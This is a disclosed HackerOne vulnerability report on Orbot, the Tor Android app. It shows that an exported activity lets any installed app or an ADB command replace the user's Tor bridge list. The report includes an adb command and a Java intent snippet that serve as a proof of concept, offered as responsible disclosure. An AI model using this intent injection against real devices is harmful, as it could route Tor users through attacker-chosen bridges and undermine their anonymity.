# [Android org.torproject.android] Possible to force list of bridges

## Report Details
- **Report ID**: 252626
- **URL**: https://hackerone.com/reports/252626
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-07-22T20:32:06.453Z
- **Disclosed**: 2017-08-21T19:11:41.303Z

## Reporter
- **Username**: bagipro
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: torproject

## Vulnerability Information
Do the following thing from ADB to emulate the activity start:
```
adb am start -n org.torproject.android/.OrbotMainActivity -a android.intent.action.VIEW -d bridge://xxx
```

Or create a malware app with the following code:
```java
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setClassName("org.torproject.android", "org.torproject.android.OrbotMainActivity");
        intent.setData(Uri.parse("bridge://xxx"));
        startActivity(intent);
```

And new list of bridges will be applied (notification will be shown and new value will be added to shared_prefs).

It's dangerous because any not authorized app (third party app) installed on the same device will be able to modify settings. On the newest Android devices this not authozed change can be done remotely from any web-browser using Instant Apps (app that doesn't require install to execute any code).

## Attachments
- Screenshot_2017-07-22-21-29-11.png
- Screenshot_2017-07-22-21-28-58.png
